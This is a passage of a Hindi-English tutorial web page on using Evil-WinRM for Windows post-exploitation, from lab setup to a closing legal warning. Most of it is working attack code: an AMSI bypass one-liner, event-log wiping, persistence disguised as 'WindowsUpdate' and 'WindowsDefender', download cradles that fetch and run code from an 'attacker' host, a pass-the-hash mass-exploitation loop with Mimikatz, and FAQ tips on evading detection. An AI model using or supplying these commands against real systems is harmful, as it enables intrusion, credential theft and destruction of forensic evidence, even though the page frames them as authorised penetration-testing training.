      </p>
      <CodeBlock
        title="AD Lab Setup"
        code={`# === VIRTUALBOX में LAB ===

# 1. Windows Server 2019 VM (Domain Controller):
# - 4GB RAM, 60GB disk
# - Static IP: 192.168.56.10
# - Active Directory Domain Services install
# - Domain: lab.local
# - DNS Server configure
# - WinRM enable: winrm quickconfig

# 2. Windows 10/11 VM (Workstation):
# - 4GB RAM, 60GB disk
# - DHCP from DC (192.168.56.10)
# - Domain join: lab.local
# - WinRM enable: winrm quickconfig
# - Local admin password set

# 3. Kali Linux VM (Attacker):
# - 2GB RAM, 40GB disk
# - Same network segment (192.168.56.0/24)
# - Evil-WinRM install: gem install evil-winrm

# === WINRM ENABLE (Target पर) ===
winrm quickconfig
Set-Item WSMan:\\\\localhost\\\\Service\\\\AllowUnencrypted -Value true
Enable-PSRemoting -Force

# === TEST CONNECTION ===
Test-WSMan -ComputerName 192.168.56.100
Test-WSMan -ComputerName 192.168.56.100 -Port 5986 -UseSSL

# === CREATE TEST USERS ===
# DC पर:
net user testuser Password123 /add
net localgroup Administrators testuser /add
net user /domain testuser Password123 /add

# === PRACTICE WORKFLOW ===
# 1. Evil-WinRM से connect करें
# 2. Mimikatz upload करके credentials dump करें
# 3. BloodHound data collect करें
# 4. Lateral movement practice करें
# 5. Persistence techniques try करें`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Evil-WinRM Usage"
        code={`# === AMSI BYPASS (AUTOMATED) ===
# Startup script load:
evil-winrm -i IP -u user -p pass -s /opt/scripts/Invoke-BypassAMSI.ps1

# Manual AMSI bypass (shell में):
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields("NonPublic,Static")|?{$_.Name -like "*Context"};[IntPtr]$c=$b.GetValue($null);[Int32[]]$d=@(0);[System.Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)

# === ANTI-FORENSICS ===
# Event logs clear:
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-WinRM/Operational"

# PowerShell history clear:
Remove-Item (Get-PSReadLineOption).HistorySavePath

# Recent files clear:
Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Recent\\*" -Force

# === LATERAL MOVEMENT AUTOMATION ===
# Evil-WinRM + CrackMapExec combo:
# Step 1: CME से WinRM access verify:
cme winrm 192.168.1.100 -u admin -H 'HASH'
# Step 2: Evil-WinRM से interactive shell:
evil-winrm -i 192.168.1.100 -u admin -H 'HASH'
# Step 3: Credentials dump:
Invoke-Mimikatz
# Step 4: नए credentials से next target:

# === PERSISTENCE ===
# Scheduled task create:
schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -w hidden -f C:\\\\temp\\\\payload.ps1" /sc onlogon /ru SYSTEM

# Registry persistence:
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsDefender" /t REG_SZ /d "powershell -ep bypass -w hidden -f C:\\\\temp\\\\payload.ps1" /f

# === EVASION TECHNIQUES ===
# 1. Encoded commands:
$cmd = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# 2. Download cradle:
IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# 3. Reflective PE load:
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker/tool.exe')
[System.Reflection.Assembly]::Load($bytes)`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated WinRM Exploitation Scripts"
        code={`#!/bin/bash
# Evil-WinRM Mass Exploitation Script

TARGET_FILE="$1"
HASH="$2"
USER="administrator"
SCRIPTS_DIR="/opt/scripts"

if [ -z "$TARGET_FILE" ] || [ -z "$HASH" ]; then
    echo "Usage: $0 targets.txt NTHASH"
    exit 1
fi

echo "[*] Starting mass exploitation..."

while IFS= read -r target; do
    echo "[+] Target: $target"

    # AMSI bypass + credential dump
    evil-winrm -i "$target" -u "$USER" -H "$HASH" -s "$SCRIPTS_DIR" -e /opt/tools/mimikatz.exe 2>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: $target"
        echo "$target" >> /tmp/compromised.txt
    else
        echo "[-] FAILED: $target"
    fi

done < "$TARGET_FILE"

echo "[*] Done. Compromised targets saved to /tmp/compromised.txt"`}
      />

      <CodeBlock
        title="Python WinRM Automation"
        code={`#!/usr/bin/env python3
# WinRM Automation Script

import winrm
import sys

def connect_winrm(target, username, password):
    """WinRM session establish करें"""
    session = winrm.Session(
        target,
        auth=(username, password),
        transport='ntlm',
        server_cert_validation='ignore'
    )
    return session

def run_command(session, command):
    """Command execute करें"""
    result = session.run_cmd(command)
    return result.std_out.decode(), result.std_err.decode()

def run_powershell(session, script):
    """PowerShell script execute करें"""
    result = session.run_ps(script)
    return result.std_out.decode(), result.std_err.decode()

# Usage:
target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

session = connect_winrm(target, username, password)

# System info:
stdout, stderr = run_command(session, 'systeminfo')
print(stdout)

# PowerShell command:
stdout, stderr = run_powershell(session, 'Get-Process | Select-Object Name,Id')
print(stdout)

# File upload:
with open('/tmp/payload.ps1', 'r') as f:
    script_content = f.read()
upload_script = f'''
$content = @'
{script_content}
'@
$content | Out-File -FilePath "C:\\\\temp\\\\payload.ps1" -Encoding UTF8
'''
stdout, stderr = run_powershell(session, upload_script)
print("[+] File uploaded")`}
      />

      <CodeBlock
        title="Ruby Custom Module"
        code={`#!/usr/bin/env ruby
# Evil-WinRM Custom Automation Module

require 'winrm'
require 'winrm-fs'

# Connection establish करें
conn = WinRM::Connection.new(
  endpoint: 'http://192.168.1.100:5985/wsman',
  user: 'administrator',
  password: 'Password123',
  :no_ssl_peer_verification => true
)

# File manager create करें
file_manager = WinRM::FS::FileManager.new(conn)

# File upload करें
file_manager.upload('/tmp/mimikatz.exe', 'C:\\\\temp\\\\mimikatz.exe') do |bytes_copied, total_bytes, local_path, remote_path|
  puts "Uploaded #{bytes_copied} bytes of #{total_bytes}"
end

# Command execute करें
conn.shell(:powershell) do |shell|
  # System info
  output = shell.run('Get-ComputerInfo | Select-Object CsName,OsVersion')
  puts output.stdout

  # Process list
  output = shell.run('Get-Process | Select-Object Name,Id -First 10')
  puts output.stdout

  # Mimikatz run
  output = shell.run('C:\\\\temp\\\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"')
  puts output.stdout
end`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Evil-WinRM और PSExec में क्या फ़र्क है?', a: 'Evil-WinRM WinRM protocol use करता है — legitimate Windows service, stealthy, no service install। PSExec SMB use करता है — service install करता है (visible in services.msc), easily detectable। Evil-WinRM built-in file transfer, PowerShell script loading, और DLL injection support करता है जो PSExec नहीं करता।' },
          { q: 'क्या WinRM enable होना ज़रूरी है?', a: 'हाँ, target Windows machine पर WinRM service enable होनी चाहिए। Default Windows installations में यह disabled होती है। Domain environments में GPO से enable किया जाता है। winrm quickconfig से manually enable करते हैं।' },
          { q: 'Pass-the-Hash कैसे काम करता है?', a: 'NTLM authentication में password hash ही actual credential है — plain text password नहीं। Mimikatz या SAM dump से hash extract करो, फिर Evil-WinRM को -H flag से hash दो। WinRM client hash को authenticate request में embed करता है — password की कोई ज़रूरत नहीं।' },
          { q: 'क्या Windows 10/11 पर काम करता है?', a: 'हाँ, Windows 10, 11, Server 2016, 2019, 2022 सब पर काम करता है। बस WinRM service enable होनी चाहिए। नए Windows versions में WinRM default में configured होता है (GPO से)।' },
          { q: 'Detection से कैसे बचें?', a: 'WinRM legitimate service है इसलिए detection naturally मुश्किल है। HTTPS use करो (encrypted traffic), unusual hours में access avoid करो, AMSI bypass load करो scripts के लिए। Event Logs (WinRM Operational) monitor करते हैं — 6, 8, 91, 168 events important हैं।' },
          { q: 'Kali में pre-installed है?', a: 'हाँ, Kali Linux और Kali Nethunter में Evil-WinRM pre-installed आता है। सिर्फ evil-winrm type करो terminal में। अगर नहीं है तो gem install evil-winrm से install करो।' },
          { q: 'बड़ी files transfer कैसे करें?', a: 'WinRM file transfer slow है Base64 encoding के कारण। Alternative methods: certutil -urlcache -split -f http://attacker/file.exe file.exe, PowerShell Invoke-WebRequest, या SMB share mount करके copy।' },
          { q: 'Multiple machines पर कैसे use करें?', a: 'Batch script बनाओ जो targets.txt से IPs read करे और loop में Evil-WinRM run करे। CrackMapExec पहले verify करे WinRM access, फिर Evil-WinRM interactive shell ले। CME -x flag से भी commands run कर सकते हो।' },
          { q: 'WinRM enable nahi hai target par — kya karein?', a: 'Pehle WinRM enable karo remotely: wmic /node:target process call create "winrm quickconfig -force"। Ya PSExec se enable karo। Domain admin credentials chahiye honge। GPO se bhi enable kar sakte ho domain environment mein।' },
          { q: 'Certificate-based authentication kaise setup karein?', a: 'Client certificate create karo, WinRM listener par HTTPS configure karo। evil-winrm -i target -S -c cert.pem -k key.pem se connect karo। Certificate authentication password se zyada reliable hai aur smart card environments mein useful है।' },
          { q: 'Kya Evil-WinRM se lateral movement kar sakte hain?', a: 'Haan, Evil-WinRM lateral movement ke liye perfect hai। Ek machine se dusri machine par WinRM access try karo। Domain credentials ya captured hashes use karo। BloodHound se attack paths identify karo pehle।' },
          { q: 'Event logs kaise clear karein?', a: 'wevtutil cl "Microsoft-Windows-WinRM/Operational" se WinRM logs clear karo। wevtutil cl Security se Security logs। Lekin log clearing itself detectable hai — SIEM alerts trigger ho sakte hain। Better approach: normal hours mein access karo।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        Evil-WinRM real-world red team operations और penetration testing में extensively use होता है:
      </p>
      <p>
        <strong className="text-white">Corporate AD Breach:</strong> एक red team engagement में tester ने phishing से initial access मिला। CrackMapExec से domain enumeration करके service account का NTLM hash capture किया। Evil-WinRM से hash-based authentication करके file server पर access मिला। Memory-mapped PowerShell scripts से credentials dump किए। तीन दिन में full domain admin access मिल गया — कोई alert trigger नहीं हुआ।
      </p>
      <p>
        <strong className="text-white">Healthcare Network Audit:</strong> Hospital के network audit में tester ने WinRM service enabled पाया (default Windows configuration)। Weak service account password brute force करके Evil-WinRM से connect किया। Patient database server पर access मिला। AMSI bypass से PowerShell Empire payload deploy किया। Full report में WinRM hardening recommendations दिए गए।
      </p>
      <p>
        <strong className="text-white">Cloud Infrastructure Test:</strong> Azure AD environment में tester ने hybrid join configuration exploit की। On-premises Windows server से Evil-WinRM से connect करके Azure AD Connect database extract की। Hash dump से cloud credentials मिले। यह attack path organization को पता नहीं था — critical finding report हुई।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Evil-WinRM को दूसरे red team tools के साथ combine करके complete attack chain बना सकते हो:
      </p>
      <CodeBlock
        title="Red Team Tool Integration"
        code={`# === Evil-WinRM + CrackMapExec ===
# Domain enumeration:
crackmapexec winrm 10.10.10.0/24 -u user -p password
# Valid credentials से Evil-WinRM:
evil-winrm -i 10.10.10.5 -u admin -p 'Password123'

# === Evil-WinRM + BloodHound ===
# BloodHound data collect करो:
evil-winrm -i 10.10.10.5 -u admin -p 'pass'
# Shell से: Invoke-BloodHound -CollectionMethod All
# BloodHound GUI में attack paths analyze करो

# === Evil-WinRM + Mimikatz ===
# Memory-mapped Mimikatz upload करो:
evil-winrm -i 10.10.10.5 -H <hash>
upload mimikatz.exe
# PowerShell से run करो (AMSI bypass first):
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# === Evil-WinRM + Rubeus ===
# Kerberos attacks:
upload Rubeus.exe
# AS-REP Roasting:
Rubeus asreproast /user:victim /domain:corp.local
# Kerberoasting:
Rubeus kerberoast

# === Evil-WinRM + PowerView ===
# Domain enumeration:
evil-winrm -i target -H hash
upload PowerView.ps1
Import-Module .\\PowerView.ps1
Get-DomainUser | Select-Object samaccountname
Get-DomainComputer | Select-Object dnshostname`}
      />

      <h2>Scripting and Automation</h2>
      <p>
        Evil-WinRM को automate करके batch operations कर सकते हो — multiple machines पर efficiently kaam karo:
      </p>
      <CodeBlock
        title="Automated WinRM Operations"
        code={`#!/bin/bash
# Evil-WinRM Batch Automation Script

TARGETS="targets.txt"
OUTPUT_DIR="loot_$(date +%Y%m%d)"
HASH="<ntlm_hash>"
USER="admin"

mkdir -p "$OUTPUT_DIR"

while IFS= read -r target; do
    echo "[*] Connecting to $target..."

    # Connection test
    evil-winrm -i "$target" -u "$USER" -H "$HASH" \\
      -c "whoami; hostname" > "$OUTPUT_DIR/$target.txt" 2>&1

    if grep -q "Evil-WinRM" "$OUTPUT_DIR/$target.txt"; then
        echo "[+] Connected to $target"

        # System info collect करो
        evil-winrm -i "$target" -u "$USER" -H "$HASH" \\
          -c "systeminfo | findstr /B /C:'OS Name' /C:'OS Version'" \\
          >> "$OUTPUT_DIR/$target.txt"

        # Network info
        evil-winrm -i "$target" -u "$USER" -H "$HASH" \\
          -c "ipconfig /all" \\
          >> "$OUTPUT_DIR/$target_network.txt"

        # Installed software
        evil-winrm -i "$target" -u "$USER" -H "$HASH" \\
          -c "wmic product get name,version" \\
          >> "$OUTPUT_DIR/$target_software.txt"

        # Shares
        evil-winrm -i "$target" -u "$USER" -H "$HASH" \\
          -c "net share" \\
          >> "$OUTPUT_DIR/$target_shares.txt"
    else
        echo "[-] Failed: $target"
    fi
done < "$TARGETS"

echo "[+] Loot saved in $OUTPUT_DIR/"`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Evil-WinRM efficiently use करने के लिए performance tips:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">HTTPS over HTTP:</strong> HTTPS (5986) use करो — encrypted traffic, firewall bypass, और credential protection</li>
        <li><strong className="text-white">Script Preloading:</strong> -s flag से script directory load करो startup par — baar-baar upload nahi karna padega</li>
        <li><strong className="text-white">File Transfer Optimization:</strong> बड़ी files के लिए Evil-WinRM की built-in transfer slow hai — certutil, SMB, ya PowerShell Invoke-WebRequest use करो</li>
        <li><strong className="text-white">Connection Reuse:</strong> Session maintain karo — disconnect/reconnect se overhead badhta hai</li>
        <li><strong className="text-white">Targeted Operations:</strong> Specific commands run karo — "whoami" ya "hostname" se test karo pehle, phir heavy payloads load karo</li>
        <li><strong className="text-white">Network Stability:</strong> Stable network connection ensure karo — WinRM sessions network interruption par disconnect ho jaate hain</li>
      </ul>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
              <th className="text-left py-2 px-3 text-neon-green">Protocol</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PSExec</td><td className="py-2 px-3">SMB-based remote execution</td><td className="py-2 px-3">SysInternals, well-known, service install</td><td className="py-2 px-3">SMB (445)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CrackMapExec</td><td className="py-2 px-3">Swiss army knife for AD</td><td className="py-2 px-3">Multi-protocol, batch operations</td><td className="py-2 px-3">SMB/WMI/WinRM</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">wmiexec</td><td className="py-2 px-3">WMI-based remote execution</td><td className="py-2 px-3">Stealthier than PSExec, no service</td><td className="py-2 px-3">WMI (135)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">psexec.py</td><td className="py-2 px-3">Impacket PSExec (Python)</td><td className="py-2 px-3">Cross-platform, smbexec, atexec variants</td><td className="py-2 px-3">SMB (445)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ssh</td><td className="py-2 px-3">OpenSSH remote access</td><td className="py-2 px-3">Standard, encrypted, cross-platform</td><td className="py-2 px-3">SSH (22)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">RDP</td><td className="py-2 px-3">Remote Desktop Protocol</td><td className="py-2 px-3">GUI access, NLA support</td><td className="py-2 px-3">RDP (3389)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PowerShell Direct</td><td className="py-2 px-3">Hyper-V guest management</td><td className="py-2 px-3">No network needed, hypervisor level</td><td className="py-2 px-3">VMBus</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">WinRM Console</td><td className="py-2 px-3">Built-in WinRS</td><td className="py-2 px-3">Windows built-in, limited features</td><td className="py-2 px-3">WinRM (5985)</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1 text-sm">
          <li>Evil-WinRM + CrackMapExec combo use करो — CME से access verify, Evil-WinRM से interactive shell</li>
          <li>Pass-the-Hash से password crack करने की ज़रूरत नहीं — hash directly use करो</li>
          <li>AMSI bypass script हमेशा ready रखो — -s flag से startup में load करो</li>
          <li>WinRM legitimate service है — PSExec से ज़्यादा stealthy है, prefer करो</li>
          <li>-s flag से script directory load करो — multiple tools एक साथ available होंगे</li>
          <li>HTTPS (5986) prefer करो — encrypted traffic, firewall bypass</li>
          <li>Kerberos auth NTLM से stealthier है domain environments में</li>
          <li>File transfer के लिए बड़ी files के लिए certutil या SMB share use करो</li>
          <li>WinRM Event Logs monitor करो — Event ID 6 (connection), 8 (auth), 91 (session creation)</li>
          <li>Kerberos authentication prefer करो NTLM over — ticket-based, more stealthy in AD environments</li>
          <li>HTTPS listener hamesha configure करो — plain HTTP par credentials clear text mein transmit hote hain</li>
          <li>IP whitelisting lagao WinRM listener par — sirf authorized IPs se access allow karo</li>
          <li>Production environment mein carefully operate karo — changes document karo aur rollback plan rakho</li>
          <li>Service accounts ko minimize karo — least privilege principle follow karo WinRM access mein</li>
          <li>PowerShell Constrained Language Mode bypass करने के लिए custom scripts use करो</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Evil-WinRM एक powerful remote access और post-exploitation tool है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और Red Team operations में ही करें। अनधिकृत Windows machine access करना गंभीर अपराध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत कंप्यूटर एक्सेस में 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। WinRM logging bypass करने का प्रयास forensic evidence destruction माना जा सकता है — केवल authorized lab environments में practice करें। Red team engagement mein hamesha rules of engagement document sign karo pehle. Scope clearly define karo — kaunse systems, kaunse techniques allowed hain. Client ko regular updates do findings ke baare mein. Emergency stop procedure agree karo pehle se. Evidence preserve karo — screenshots, logs, captured credentials sab document karo. Engagement khatam hone ke baad sab access revoke karo aur cleanup karo. Responsible disclosure follow karo — vulnerabilities privately report karo vendor ko. Training ke liye sirf apna lab environment use karo — real systems par bina permission test mat karo.
      </div>
      <h2>Reporting and Output Analysis</h2>
      <p>
        Evil-WinRM sessions se collect kiye gaye data ko properly document karo — pentest report mein include karna zaroori hai:
      </p>
      <CodeBlock
        title="Session Logging and Reporting"
        code={`# === Evil-WinRM Session Logging ===
# Connection details log karo:
TARGET="10.10.10.5"
LOGFILE="evilwinrm_$(date +%Y%m%d_%H%M%S).log"

# System info collect karo:
evil-winrm -i $TARGET -H <hash> -c "systeminfo" > $LOGFILE
echo "---" >> $LOGFILE
evil-winrm -i $TARGET -H <hash> -c "whoami /all" >> $LOGFILE
echo "---" >> $LOGFILE
evil-winrm -i $TARGET -H <hash> -c "ipconfig /all" >> $LOGFILE
echo "---" >> $LOGFILE
evil-winrm -i $TARGET -H <hash> -c "net user" >> $LOGFILE
echo "---" >> $LOGFILE
evil-winrm -i $TARGET -H <hash> -c "net localgroup administrators" >> $LOGFILE

# === Automated Evidence Collection ===
#!/bin/bash
TARGET="$1"
HASH="$2"
EVIDENCE="evidence_$(date +%Y%m%d)"

mkdir -p "$EVIDENCE"

# Running processes
evil-winrm -i "$TARGET" -H "$HASH" \\
  -c "tasklist /v" > "$EVIDENCE/processes.txt"

# Network connections
evil-winrm -i "$TARGET" -H "$HASH" \\
  -c "netstat -ano" > "$EVIDENCE/network.txt"

# Installed patches
evil-winrm -i "$TARGET" -H "$HASH" \\
  -c "wmic qfe list full" > "$EVIDENCE/patches.txt"

# Shares
evil-winrm -i "$TARGET" -H "$HASH" \\
  -c "net share" > "$EVIDENCE/shares.txt"

# Services
evil-winrm -i "$TARGET" -H "$HASH" \\
  -c "wmic service list brief" > "$EVIDENCE/services.txt"

echo "[+] Evidence collected in $EVIDENCE/"`}
      />

    </TutorialLayout>
  )
}
